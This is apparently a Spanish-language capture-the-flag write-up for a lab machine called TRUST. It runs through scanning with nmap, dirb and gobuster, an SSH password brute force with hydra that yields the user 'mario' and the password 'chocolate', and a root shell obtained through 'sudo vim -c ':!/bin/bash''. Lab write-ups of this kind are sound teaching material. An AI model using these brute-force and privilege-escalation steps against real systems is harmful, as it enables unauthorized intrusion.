---
description: 'Dificultad: Muy fácil'
---

# Máquina TRUST

Fecha: 08 de Marzo de 2025

Objetivo: 172.18.0.2

***

## Fase de reconocimiento

Comenzamos haciendo un ping a la máquina para ver si nos contesta.

```
ping 172.18.0.2
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Respuesta al comando ping</p></figcaption></figure>

Lanzamos el comando NMAP, con los parámetros -sV y -O.

```
nmap -sV 172.18.0.2 -O
```

Acabamos de averiguar que la máquina objetivo dispone de los puertos 80 y 22 abiertos, y funcionando actualmente.&#x20;

* 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)&#x20;
* 80/tcp open http Apache httpd 2.4.57 ((Debian))

Vamos a visitar la web, para ver que nos arroja el puerto 80.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Captura de pantalla de la salida de Apache al instalar un nuevo servidor</p></figcaption></figure>

Vemos que nos retorna la página de configuración del servidor Apache Web Service. Vamos a probar con los ficheros robots.txt y sitemap.xml para ver si contienen información.

No existen los ficheros robots.txt, ni el sitemap.xml.

Vamos a ver que nos reporta _**Wappalyzzer**_ y podemos ver que nos dice que se trata de un servidor Linux, con un _**"Apache HTTP Service"**_ y una distribución **Debian**.

Probamos con el comando _**whatweb**_ con el parámetro -v y nos reporta lo siguiente.

```
whatweb 172.18.0.2 -v
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Ssalida del whatweb -v</p></figcaption></figure>

Hice un _**dirb**_ para hallar directorios ocultos y me encontré con el siguiente output del comando.

```
dirb http://172.18.0.2
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Salida del comando dirb</p></figcaption></figure>

He encontrado una zona llamada _**server-status**_, pero al intentar navegar y acceder a esa parte me aparece lo siguiente.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al intentar navegar me dice que tengo el acceso prohíbido.

Vamos a hacer un poco de Fuzzing. El Fuzzing consiste en una metodología en la que enviaremos datos aleatorios o modificados a una aplicación web con el objetivo de provocar errores o descubrir vulnerabilidades.

Primero buscaremos los directorios afectados.

```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -t 30 -o results.txt

```

El comando nos reporta esta salida

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Salida del comando gobuster haciendo fuzzing</p></figcaption></figure>

Ahora que ya hemos extraido los directorios, buscaremos en los ficheros.

```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -o results_files.txt

```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Salida de los ficheros encontrados en la máquina objetivo</p></figcaption></figure>

Podemos ver que hay 3 ficheros en verde que nos devuelven un código 200.

Hemos visitado la web objetivo 172.18.0.2/secret.php y hemos encontrado esto.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Fase de Explotación

Lo único que se me ocurre es hacer fuerza bruta al puerto 22 (ssh) pero no se si existe otra solución.

Para ello solo conozco en estos momentos, [hydra](https://www.kali.org/tools/hydra/). Lanzaremos pues el comando para averiguar el password mediante hydra.

```
hydra -l mario -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://172.18.0.2
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Resultados del ataque al objetivo con Hydra</p></figcaption></figure>

***

## Fase de Post-Explotación

Una vez obtenidas las credenciales del usuario. Podemos acceder a la máquina objetivo mediante SSH.

```
ssh mario@172.18.0.2
```

Introducimos la password encontrada anteriormente <mark style="color:blue;">**chocolate**</mark>, y estamos dentro.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora deberíamos buscar los ficheros vulnarables que tenga comprometidos la máquina a nivel de sistema que el SUID sea del usuario root. Para ello lanzaremos el siguiente comando

```
find / -perm -4000 -user root 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que la salida del comando nos retorna todos estos ficheros.

Probamos a ver si nos permite ejecutar algo como root.

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption><p>Output del sudo -l</p></figcaption></figure>

Vemos que podemos ejecutar sobre vim. Sino sabemos como explotarlo, siempre podemos consultar [GTFOBins ](https://gtfobins.github.io/)

```
sudo vim -c ':!/bin/bash'
```

Y si hacemos un whoami podemos ver que ya somos root.

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
